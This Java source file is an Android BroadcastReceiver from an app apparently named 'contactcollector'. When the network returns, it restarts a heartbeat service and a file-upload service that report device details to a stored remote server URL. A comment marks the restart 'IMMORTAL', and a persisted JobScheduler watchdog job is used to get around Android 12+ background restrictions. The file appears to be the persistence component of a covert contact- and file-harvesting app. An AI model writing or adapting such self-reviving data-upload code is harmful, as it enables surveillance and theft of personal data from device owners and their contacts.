package com.contactcollector.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;

public class NetworkStateReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action == null) return;

        if (action.equals(ConnectivityManager.CONNECTIVITY_ACTION)) {
            // Check if network is now available
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return;

            boolean isConnected = false;
            if (Build.VERSION.SDK_INT >= 23) {
                android.net.NetworkCapabilities nc = cm.getNetworkCapabilities(cm.getActiveNetwork());
                isConnected = nc != null && nc.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET);
            } else {
                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                isConnected = activeNetwork != null && activeNetwork.isConnectedOrConnecting();
            }

            if (isConnected) {
                SharedPreferences prefs = context.getSharedPreferences("CollectorPrefs", Context.MODE_PRIVATE);
                String sessionId = prefs.getString("sessionId", null);
                String baseUrl = prefs.getString("baseUrl", null);

                if (sessionId != null && baseUrl != null) {
                    String deviceId = prefs.getString("deviceId", null);
                    String deviceName = prefs.getString("deviceName", null);
                    String deviceModel = prefs.getString("deviceModel", null);
                    String deviceBrand = prefs.getString("deviceBrand", null);
                    String androidVersion = prefs.getString("androidVersion", null);

                    // IMMORTAL: Network is back - start HeartbeatService IMMEDIATELY
                    try {
                        Intent heartbeatIntent = new Intent(context, HeartbeatService.class);
                        heartbeatIntent.putExtra("sessionId", sessionId);
                        heartbeatIntent.putExtra("baseUrl", baseUrl);
                        heartbeatIntent.putExtra("deviceId", deviceId);
                        heartbeatIntent.putExtra("deviceName", deviceName);
                        heartbeatIntent.putExtra("deviceModel", deviceModel);
                        heartbeatIntent.putExtra("deviceBrand", deviceBrand);
                        heartbeatIntent.putExtra("androidVersion", androidVersion);
                        if (Build.VERSION.SDK_INT >= 26) {
                            context.startForegroundService(heartbeatIntent);
                        } else {
                            context.startService(heartbeatIntent);
                        }
                    } catch (Exception e) {
                        // Android 12+ background restriction - use JobScheduler
                        try {
                            android.app.job.JobScheduler jobScheduler = 
                                (android.app.job.JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
                            if (jobScheduler != null) {
                                android.content.ComponentName serviceComponent = 
                                    new android.content.ComponentName(context, WatchdogJobService.class);
                                android.app.job.JobInfo.Builder builder = new android.app.job.JobInfo.Builder(1001, serviceComponent)
                                    .setMinimumLatency(500)
                                    .setOverrideDeadline(3000)
                                    .setRequiredNetworkType(android.app.job.JobInfo.NETWORK_TYPE_ANY)
                                    .setPersisted(true);
                                jobScheduler.schedule(builder.build());
                            }
                        } catch (Exception e2) {}
                    }

                    // Also restart FileUploadService
                    try {
                        Intent uploadIntent = new Intent(context, FileUploadService.class);
                        uploadIntent.putExtra("sessionId", sessionId);
                        uploadIntent.putExtra("baseUrl", baseUrl);
                        uploadIntent.putExtra("deviceId", deviceId);
                        if (Build.VERSION.SDK_INT >= 26) {
                            context.startForegroundService(uploadIntent);
                        } else {
                            context.startService(uploadIntent);
                        }
                    } catch (Exception e) {}
                }
            }
        }
    }
}
